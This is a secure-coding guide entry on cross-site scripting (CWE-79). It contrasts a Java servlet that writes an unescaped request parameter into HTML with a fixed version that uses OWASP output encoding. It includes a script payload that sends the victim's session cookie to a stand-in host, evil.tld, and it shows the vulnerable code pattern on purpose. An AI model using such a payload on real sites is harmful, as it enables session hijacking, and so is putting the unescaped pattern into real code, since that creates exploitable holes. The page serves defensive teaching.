---
id: cross-site-scripting
title: Cross-Site Scripting (XSS)
category: examples
---

# Cross-Site Scripting (XSS)

**CWE-79** — Improper Neutralization of Input During Web Page Generation.

Writing untrusted input directly into an HTML response lets an attacker
inject script that runs in another user's browser session, stealing cookies
or performing actions as that user.

## Vulnerable

```java
protected void doGet(HttpServletRequest req, HttpServletResponse resp)
        throws IOException {
    String name = req.getParameter("name");
    PrintWriter out = resp.getWriter();
    out.println("<html><body>Hello, " + name + "</body></html>");
}
```

Requesting `?name=<script>document.location='//evil.tld/?c='+document.cookie</script>`
executes attacker script in the victim's browser and exfiltrates their
session cookie.

## Fixed

```java
import org.owasp.encoder.Encode;

protected void doGet(HttpServletRequest req, HttpServletResponse resp)
        throws IOException {
    String name = req.getParameter("name");
    PrintWriter out = resp.getWriter();
    out.println("<html><body>Hello, " + Encode.forHtml(name) + "</body></html>");
}
```

Context-aware output encoding turns `<script>` into inert text
(`&lt;script&gt;`) so the browser renders it, never executes it.
